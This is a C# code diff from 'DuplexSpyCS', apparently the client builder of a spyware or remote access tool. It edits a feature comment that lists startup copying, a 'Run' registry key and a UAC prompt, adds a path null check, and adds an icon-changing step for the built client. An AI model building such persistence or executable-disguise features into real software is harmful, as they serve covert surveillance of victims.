@@ -34,13 +34,8 @@ namespace DuplexSpyCS
          * 
          * Done:
          * - winClient48
-         * - MessageBox
-         * - Copy to specified directory.
-         * - Copy to startup.
-         * - Set "Run" registry.
          * 
          * Todo:
-         * - UAC prompt
          * - Small
          * - Tipoff
          * 
@@ -403,7 +398,10 @@ namespace DuplexSpyCS
                 //.Replace("inf", "3.40282347E+38")
                 );
 
-                string szDirName = Path.GetDirectoryName(filePath); //Directory path.
+                string? szDirName = Path.GetDirectoryName(filePath); //Directory path.
+                if (string.IsNullOrEmpty(szDirName))
+                    throw new Exception("Directionary is null or empty.");
+
                 string szFileName = Path.GetFileNameWithoutExtension(filePath); //Filename without extension.
                 string szPdbFile = $"{szDirName}\\{szFileName}.pdb"; //Debug file.
                 bool bExists = File.Exists(szPdbFile);
@@ -418,8 +416,22 @@ namespace DuplexSpyCS
                         File.Delete(szPdbFile);
                     }
 
+                    
+
                     //Print message.
                     logsOK("Build client successfully: " + filePath);
+
+                    if (buildConfig.bIcon)
+                    {
+                        if (!ChangeIcon(filePath))
+                        {
+                            logsErr("Change icon failed.");
+                            return;
+                        }
+
+                        logsOK("Change icon successfully.");
+                    }
+
                     logsOK("*******************************************");
                     logsOK("Finished");
                     logsOK("*******************************************");
